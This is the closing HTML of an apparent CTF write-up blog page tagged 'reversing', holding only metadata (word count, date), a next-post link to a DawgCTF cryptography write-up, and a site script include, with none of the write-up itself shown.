        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://pablo10diez2.github.io/webPablo/categories/reversing/">reversing</a></span>
        
    </p>


      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        1515 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2025-04-21 02:00
        

         
          
        
      </p>
    </div>

    
    <div class="pagination">
        

        <div class="pagination__buttons">
            

            
            <span class="button next">
                <a href="https://pablo10diez2.github.io/webPablo/posts/dawgctf/cantorspairadox/">
                    <span class="button__text">[Cryptography] Cantors Pairadox</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


    

    

    

  </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/webPablo/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>




    </body>
</html>
